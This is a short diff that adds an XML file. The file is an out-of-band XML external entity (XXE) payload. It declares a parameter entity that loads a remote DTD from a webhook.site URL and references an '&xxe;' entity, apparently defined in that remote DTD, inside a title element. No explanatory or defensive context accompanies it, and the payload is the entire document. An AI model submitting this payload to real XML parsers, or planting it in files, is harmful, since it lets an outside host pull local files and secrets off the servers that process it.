@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://webhook.site/900ca284-4d3c-4ac0-a24e-53c07cb6ec28">
+  %remote;
+]>
+<root>
+  <title>&xxe;</title>
+  <author>dsmcamila</author>
+</root>
